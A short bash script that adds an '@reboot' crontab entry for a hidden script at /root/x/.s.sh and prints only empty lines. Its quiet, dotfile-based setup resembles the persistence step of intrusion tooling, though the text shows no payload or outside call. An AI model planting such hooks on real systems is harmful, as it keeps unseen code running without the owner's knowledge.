#!/bin/bash

PROGRAM_PATH="/root/x/.s.sh"

crontab -l | grep -q "@reboot $PROGRAM_PATH"

if [ $? -ne 0 ]; then
  (crontab -l 2>/dev/null; echo "@reboot $PROGRAM_PATH") | crontab -
  echo ""
else
  echo ""
fi